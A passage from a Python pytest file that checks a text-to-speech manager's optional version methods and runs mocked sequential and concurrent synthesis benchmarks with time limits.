                except (NotImplementedError, ValueError, AttributeError, RuntimeError):
                    # These are acceptable exceptions for unsupported operations
                    pass
    
    def test_version_compatibility_if_available(self):
        """Test version compatibility checking if implemented"""
        version_methods = ['get_version', 'check_compatibility', '__version__']
        
        for method in version_methods:
            if hasattr(TTSManager, method):
                try:
                    version_info = getattr(TTSManager, method)
                    if callable(version_info):
                        result = version_info()
                        assert result is not None
                    else:
                        assert isinstance(version_info, str)
                except (NotImplementedError, AttributeError):
                    # Version methods might not be fully implemented
                    pass


class TestTTSManagerBenchmarkAndPerformance:
    """Optional benchmark tests for performance validation"""
    
    @pytest.mark.benchmark
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_synthesis_performance_benchmark(self, mock_gtts, mock_ensure_dirs):
        """Benchmark synthesis performance for multiple operations"""
        manager = TTSManager(tts_service_name="gtts")
        
        start_time = time.time()
        
        with patch.object(manager, 'synthesize_speech', return_value=b'benchmark_audio'):
            for i in range(10):
                result = manager.synthesize_speech(f"Benchmark text {i}")
                assert result == b'benchmark_audio'
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Should complete 10 syntheses reasonably quickly
        assert duration < 5.0  # 5 seconds max for 10 operations
    
    @pytest.mark.benchmark
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_concurrent_synthesis_benchmark(self, mock_gtts, mock_ensure_dirs):
        """Benchmark concurrent synthesis performance"""
        manager = TTSManager(tts_service_name="gtts")
        
        start_time = time.time()
        
        with patch('asyncio.to_thread', return_value=None):
            tasks = [
                manager.synthesize(f"Concurrent benchmark text {i}", f"output_{i}.mp3")
                for i in range(5)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
        end_time = time.time()
        duration = end_time - start_time
        
        # Concurrent operations should complete efficiently
        assert duration < 3.0
        assert len(results) == 5
        
        # Count successful operations
        success_count = sum(1 for r in results if not isinstance(r, Exception))
        assert success_count >= 3  # Allow for some potential failures